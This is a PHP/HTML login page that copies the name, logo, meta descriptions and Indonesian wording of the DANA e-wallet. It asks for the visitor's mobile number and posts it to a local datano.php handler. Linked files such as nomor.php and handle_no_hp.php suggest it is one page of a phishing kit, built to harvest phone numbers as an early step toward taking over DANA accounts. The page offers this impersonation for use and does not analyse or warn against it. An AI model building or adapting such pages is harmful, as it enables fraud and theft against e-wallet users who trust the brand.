<?php
require_once __DIR__ . '/functions/handle_no_hp.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['nomor'])) {
        handle_no_hp($_POST['nomor']);
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta name="theme-color" content="#118ee9" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
    <meta name="twitter:image" content="https://a.m.dana.id/danaweb/web/dana-meta-logo.png" />
    <meta property="og:image" content="https://a.m.dana.id/danaweb/web/dana-meta-logo.png" />
    <meta name="og:site_name" content="DANA.id" />
    <meta name="description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!" />
    <meta name="twitter:title" content="DANA - Apa pun transaksinya selalu ada DANA" />
    <meta name="twitter:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!" />
    <meta name="og:title" content="DANA - Apa pun transaksinya selalu ada DANA" />
    <meta name="og:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!" />
    <meta name="keywords" content="dana, dana indonesia, dana bisnis, qris, qris adalah, qris indonesia, daftar qris, qris bank indonesia, qris dana, qris bi, qris merchant, logo qris, apa itu qris, pembayaran qris, merchant, merchant dana, daftar merchant, promo hari ini, promo terbaru, promo cashback, cashback, apa itu cashback, cashback adalah, apa itu ewallet, ewallet indonesia, pembayaran digital, dompet digital" />
    <link rel="icon" type="image/x-icon" href="https://www.dana.id/favicon.ico" />
    <link rel="preconnect" href="https://a.m.dana.id" />
    <link rel="dns-prefetch" href="https://a.m.dana.id" />
    <link rel="preconnect" href="https://app.link" />
    <link rel="dns-prefetch" href="https://app.link" />
    <link rel="preconnect" href="https://api2.branch.io" />
    <link rel="dns-prefetch" href="https://api2.branch.io" />
    <link rel="preconnect" href="https://youtube.com" />
    <link rel="dns-prefetch" href="https://youtube.com" />
    <link rel="preconnect" href="https://sentry.io" />
    <link rel="dns-prefetch" href="https://sentry.io" />
    <link rel="preconnect" href="https://cdn.lr-ingest.io" />
    <link rel="dns-prefetch" href="https://cdn.lr-ingest.io" />
    <title>DANA - Apa pun transaksinya selalu ada DANA</title>
    <link rel="stylesheet" type="text/css" href="css/main.css" />
    <link rel="stylesheet" type="text/css" href="css/spinner.css" />
</head>

<body>
    <div class="container">
        <a class="aback" href="nomor.php"><img class="back" src="img/back.png" alt="Kembali" /></a>
        <img class="dana_logo" src="img/dana_logo.png" alt="Logo DANA" />
        <h1 class="page-login">
            Masukkan <b class="bh1">nomor HP</b> kamu untuk lanjut
        </h1>
        <div class="inputNo">
            <form class="formNo" action="datano.php" method="post">
                <label for="nope" class="flagNo"><img class="flagIndo" src="img/indo.png" alt="Bendera Indonesia" /></label>
                <label for="nope">
                    <p class="codeTel">+62</p>
                </label>
                <input name="nomor" class="nope" id="nope" type="tel" placeholder="811-1234-5678" autocomplete="off" required />
                <h1 class="syarat">
                    Dengan melanjutkan, kamu setuju dengan
                    <b class="bh1">Syarat & Ketentuan</b> dan
                    <b class="bh1">Kebijakan Privasi</b> kami
                </h1>
                <center class="btn">
                    <button type="submit" class="send_data">LANJUT</button>
                </center>
            </form>
        </div>
    </div>
    <div id="process" name="process" class="process" style="display: none;">
        <div class="loading">
            <img src="img/load_bg.png" alt="Latar Belakang Memuat" />
            <img class="spinner" src="img/load_spin.png" alt="Memuat..." />
        </div>
    </div>
    <script src="js/jquery.min.js"></script>
    <script src="js/jquery.mask.min.js"></script>
    <script src="js/function.js"></script>
</body>

</html>
